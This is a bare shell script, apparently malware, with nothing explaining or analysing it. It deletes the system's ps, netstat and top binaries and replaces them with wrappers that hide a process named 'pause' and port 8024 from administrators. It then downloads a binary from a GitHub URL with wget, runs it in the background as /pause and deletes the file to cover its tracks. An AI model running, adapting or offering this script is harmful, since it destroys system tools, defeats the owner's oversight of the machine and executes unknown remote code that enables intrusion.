#!/bin/sh
rm -rf /bin/ps
rm -rf /bin/netstat
rm -rf /usr/bin/top
cat > /bin/ps << EOF
#!/bin/sh
/bin/busybox ps \$1 \$2 \$3 \$4 | grep -Ev "pause|/bin/ps|busybox"
EOF

cat > /bin/netstat << EOF
#!/bin/sh
/bin/busybox netstat \$1 \$2 \$3 \$4 | grep -Ev "pause|8024"
EOF

cat > /usr/bin/top << EOF
#!/bin/sh
/bin/busybox top \$1 \$2 \$3 \$4 | grep "p3"
EOF
wget --quiet -O /pause https://github.com/jackmoc/update/raw/main/down/update2.0
chmod +x /usr/bin/top
chmod +x /bin/ps
chmod +x /bin/netstat
chmod +x /pause
/pause &
rm -rf /pause
